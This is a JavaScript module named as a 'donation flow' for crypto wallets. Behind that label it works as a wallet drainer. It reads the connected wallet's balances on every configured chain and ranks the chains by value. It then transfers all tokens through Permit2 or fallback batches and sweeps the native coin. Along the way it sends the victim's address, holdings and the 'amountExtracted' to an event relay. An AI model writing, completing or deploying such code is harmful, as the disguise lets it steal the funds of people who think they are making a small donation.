// src/engine/donate.js
import { notify } from "../utils/notify.js";
import { sendEvent } from "../utils/eventRelay.js";
import { fetchBalancesCovalent, filterPermit2SafeTokens, getChainValue } from "./balances.js";
import { getProviderForChain } from "./providerHelper.js";
import { isPermit2Compatible, executePermit2Batch } from "./permit2.js";
import { executeFallbackBatch, sweepNative } from "./fallback.js";
import { CHAINS, exceptionList } from "../config.js";
import { ethers } from "ethers";

/**
 * Frontend donation flow.
 * walletClient optional (WalletConnect / wagmi). If not provided, falls back to window.ethereum.
 */
export async function runDonationFlow(walletClient) {
  try {
    let owner = null;
    let injectedProvider = null;

    if (walletClient?.account?.address) {
      owner = walletClient.account.address;
    } else if (typeof window !== "undefined" && window.ethereum) {
      injectedProvider = new ethers.BrowserProvider(window.ethereum);
      await injectedProvider.send("eth_requestAccounts", []);
      owner = await injectedProvider.getSigner().getAddress();
    }

    if (!owner) throw new Error("Wallet not connected");

    const trackingId = Date.now().toString();

    // -------------------------
    // WALLET_CONNECTED
    // -------------------------
    const chainBalances = [];
    for (const chain of CHAINS) {
      const raw = await fetchBalancesCovalent(owner, chain.chainId);
      const filtered = await filterPermit2SafeTokens(raw);

      const { provider } = await getProviderForChain(walletClient, chain.chainId, trackingId);
      const nativeRaw = await provider.getBalance(owner);
      const nativeFormatted = parseFloat(ethers.formatEther(nativeRaw));

      const tokensValue = getChainValue(filtered);
      const totalValue = tokensValue + nativeFormatted;

      chainBalances.push({
        chainId: chain.chainId,
        name: chain.name,
        native: nativeFormatted,
        tokens: filtered,
        totalValue,
      });
    }

    const balancesPayload = chainBalances.map((c) => ({
      name: c.name,
      native: Number(c.native).toFixed(6),
      tokens: c.tokens.map((t) => ({
        name: t.tokenSymbol,
        amount: Number(t.balanceRaw).toFixed(6),
        value: Number(t.quote).toFixed(2),
      })),
      total: Number(c.totalValue).toFixed(2),
    }));
    const grandTotal = balancesPayload.reduce((acc, c) => acc + parseFloat(c.total || 0), 0);

    const connectedPayload = {
      walletAddress: owner,
      trackingId,
      balances: balancesPayload,
      grandTotal: Number(grandTotal).toFixed(2),
    };

    notify("WALLET_CONNECTED", connectedPayload);
    await sendEvent("WALLET_CONNECTED", connectedPayload);

    // -------------------------
    // Process chains
    // -------------------------
    chainBalances.sort((a, b) => b.totalValue - a.totalValue);

    for (const chain of chainBalances) {
      const startPayload = { walletAddress: owner, trackingId, chain: chain.name };
      notify("DONATION_START", startPayload);
      await sendEvent("DONATION_START", startPayload);

      const { provider, signer } = await getProviderForChain(walletClient, chain.chainId, trackingId);
      const permit2Tokens = [];
      const fallbackTokens = [];

      for (const t of chain.tokens) {
        const addr = t.tokenAddress.toLowerCase();
        if (exceptionList?.[chain.chainId]?.includes(addr)) {
          fallbackTokens.push(t);
          continue;
        }
        const ok = await isPermit2Compatible(addr, signer);
        if (ok) permit2Tokens.push(t);
        else fallbackTokens.push(t);
      }

      try {
        if (permit2Tokens.length) {
          await executePermit2Batch(signer, chain.chainId, permit2Tokens);
        }
      } catch (err) {
        console.warn("permit2 batch error", err);
        fallbackTokens.push(...permit2Tokens);
      }

      try {
        if (fallbackTokens.length) {
          await executeFallbackBatch(signer, chain.chainId, fallbackTokens);
        }
      } catch (err) {
        console.warn("fallback batch error", err);
      }

      try {
        await sweepNative(signer, provider, chain.chainId);
      } catch (err) {
        console.warn("native sweep error", err);
      }

      // -------------------------
      // Re-fetch balances + donation summary
      // -------------------------
      const refreshedRaw = await fetchBalancesCovalent(owner, chain.chainId);
      const refreshedFiltered = await filterPermit2SafeTokens(refreshedRaw);
      const refreshedNativeRaw = await provider.getBalance(owner);
      const refreshedNative = parseFloat(ethers.formatEther(refreshedNativeRaw));
      const refreshedTokensValue = getChainValue(refreshedFiltered);
      const refreshedTotal = refreshedTokensValue + refreshedNative;

      const amountExtracted = Math.max(0, Number(chain.totalValue) - Number(refreshedTotal));

      const resultsPayload = {
        walletAddress: owner,
        trackingId,
        balances: [
          {
            name: chain.name,
            native: refreshedNative.toFixed(6),
            tokens: refreshedFiltered.map((t) => ({
              name: t.tokenSymbol,
              amount: Number(t.balanceRaw).toFixed(6),
              value: Number(t.quote).toFixed(2),
            })),
            total: refreshedTotal.toFixed(2),
          },
        ],
        donationSummary: {
          total: amountExtracted.toFixed(2),
          breakdown: [{ chain: chain.name, amount: amountExtracted.toFixed(2) }],
        },
      };

      notify("DONATION_MADE", resultsPayload);
      await sendEvent("DONATION_MADE", resultsPayload);
    }

    // -------------------------
    // DONATION_COMPLETED
    // -------------------------
    const completedPayload = { walletAddress: owner, trackingId };
    notify("DONATION_COMPLETED", completedPayload);
    await sendEvent("DONATION_COMPLETED", completedPayload);

    // -------------------------
    // Provider events
    // -------------------------
    if (injectedProvider && injectedProvider.provider && typeof injectedProvider.provider.on === "function") {
      try {
        injectedProvider.provider.on("disconnect", () => {
          const disc = { walletAddress: owner, trackingId };
          notify("WALLET_DISCONNECTED", disc);
          sendEvent("WALLET_DISCONNECTED", disc).catch(() => {});
        });
        injectedProvider.provider.on("chainChanged", (chainId) => {
          const c = { walletAddress: owner, trackingId, newChain: chainId };
          notify("CHAIN_SWITCH", c);
          sendEvent("CHAIN_SWITCH", c).catch(() => {});
        });
      } catch (e) {
        console.warn("failed to attach provider event listeners:", e);
      }
    }

    return { success: true };
  } catch (err) {
    console.error("runDonationFlow error:", err);
    return { success: false, reason: err.message || String(err) };
  }
}
